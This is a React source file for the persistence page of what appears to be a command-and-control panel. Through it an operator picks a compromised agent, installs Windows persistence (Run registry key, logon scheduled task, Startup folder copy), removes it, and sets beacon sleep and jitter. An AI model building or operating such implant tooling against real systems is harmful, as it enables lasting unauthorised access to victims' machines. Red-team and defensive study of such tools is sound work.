import { useState, useEffect } from 'react'
import axios from 'axios'

interface Agent {
  agent_id: string
  hostname: string
  os: string
}

const Persistence = () => {
  const [agents, setAgents] = useState<Agent[]>([])
  const [selectedAgent, setSelectedAgent] = useState('')
  const [result, setResult] = useState('')
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)
  const [beaconSleep, setBeaconSleep] = useState('10000')
  const [beaconJitter, setBeaconJitter] = useState('0.33')

  useEffect(() => {
    axios.get('/api/live/agents').then(res => {
      const list = Object.entries(res.data).map(([id, info]: [string, any]) => ({
        agent_id: id, hostname: info.hostname || 'Unknown', os: info.os || 'Unknown',
      }))
      setAgents(list)
      if (list.length > 0) setSelectedAgent(list[0].agent_id)
    }).catch(() => {})
  }, [])

  const sendCommand = async (cmd: any) => {
    setLoading(true)
    setError('')
    setResult('')
    try {
      const res = await axios.post(`/api/live/agents/${selectedAgent}/command`, cmd)
      const cmdId = res.data?.cmd_id
      for (let i = 0; i < 30; i++) {
        await new Promise(r => setTimeout(r, 1000))
        const poll = await axios.get(`/api/live/agents/${selectedAgent}/result/${cmdId}`)
        if (poll.data?.status && poll.data.status !== 'pending') {
          if (poll.data.status === 'error') { setError(poll.data.error || 'Failed'); setLoading(false); return }
          setResult(poll.data.output || 'Success')
          setLoading(false)
          return
        }
      }
      setError('Command timed out')
    } catch (e: any) { setError(e.message) }
    setLoading(false)
  }

  const methods = [
    { type: 'persist_registry', label: 'Registry Run Key', desc: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', icon: '🔑', color: 'blue' },
    { type: 'persist_schtask', label: 'Scheduled Task', desc: 'Creates a scheduled task that runs at logon', icon: '📅', color: 'purple' },
    { type: 'persist_startup', label: 'Startup Folder', desc: 'Copies agent to user Startup folder', icon: '📁', color: 'green' },
  ]

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold text-white">Persistence & Config</h1>
        <select
          value={selectedAgent}
          onChange={e => setSelectedAgent(e.target.value)}
          className="bg-gray-800 text-white border border-gray-600 rounded px-3 py-2"
        >
          {agents.map(a => (
            <option key={a.agent_id} value={a.agent_id}>{a.hostname} ({a.os})</option>
          ))}
        </select>
      </div>

      {error && <div className="bg-red-900/30 border border-red-700 text-red-400 p-3 rounded">{error}</div>}
      {result && <div className="bg-green-900/30 border border-green-700 text-green-400 p-3 rounded whitespace-pre-wrap">{result}</div>}

      {/* Persistence Methods */}
      <div className="grid grid-cols-3 gap-4">
        {methods.map(m => (
          <div key={m.type} className="bg-gray-800 p-5 rounded-lg border border-gray-700 hover:border-gray-500 transition">
            <div className="text-3xl mb-3">{m.icon}</div>
            <h3 className="text-white font-semibold text-lg">{m.label}</h3>
            <p className="text-gray-400 text-sm mt-1 mb-4">{m.desc}</p>
            <button
              onClick={() => sendCommand({ type: m.type })}
              disabled={loading || !selectedAgent}
              className={`w-full bg-${m.color}-600 hover:bg-${m.color}-700 text-white py-2 rounded disabled:opacity-50`}
            >
              {loading ? 'Installing...' : 'Install'}
            </button>
          </div>
        ))}
      </div>

      {/* Remove Persistence */}
      <div className="bg-gray-800 p-5 rounded-lg border border-red-900/50">
        <h3 className="text-red-400 font-semibold text-lg mb-2">Remove Persistence</h3>
        <p className="text-gray-400 text-sm mb-4">Remove all installed persistence mechanisms from the target</p>
        <button
          onClick={() => sendCommand({ type: 'persist_remove' })}
          disabled={loading || !selectedAgent}
          className="bg-red-600 hover:bg-red-700 text-white px-6 py-2 rounded disabled:opacity-50"
        >
          Remove All
        </button>
      </div>

      {/* Beacon Configuration */}
      <div className="bg-gray-800 p-5 rounded-lg border border-gray-700">
        <h3 className="text-cyan-400 font-semibold text-lg mb-4">Beacon Configuration</h3>
        <div className="grid grid-cols-2 gap-4">
          <div>
            <label className="text-gray-400 text-sm">Sleep Interval (ms)</label>
            <input
              type="number"
              value={beaconSleep}
              onChange={e => setBeaconSleep(e.target.value)}
              className="w-full bg-gray-900 text-white border border-gray-600 rounded px-3 py-2 mt-1"
            />
          </div>
          <div>
            <label className="text-gray-400 text-sm">Jitter (%)</label>
            <input
              type="number"
              step="0.01"
              value={beaconJitter}
              onChange={e => setBeaconJitter(e.target.value)}
              className="w-full bg-gray-900 text-white border border-gray-600 rounded px-3 py-2 mt-1"
            />
          </div>
        </div>
        <button
          onClick={() => sendCommand({
            type: 'config_beacon',
            sleep_ms: parseInt(beaconSleep),
            jitter_pct: parseFloat(beaconJitter),
          })}
          disabled={loading || !selectedAgent}
          className="mt-4 bg-cyan-600 hover:bg-cyan-700 text-white px-6 py-2 rounded disabled:opacity-50"
        >
          Update Beacon Config
        </button>
      </div>
    </div>
  )
}

export default Persistence
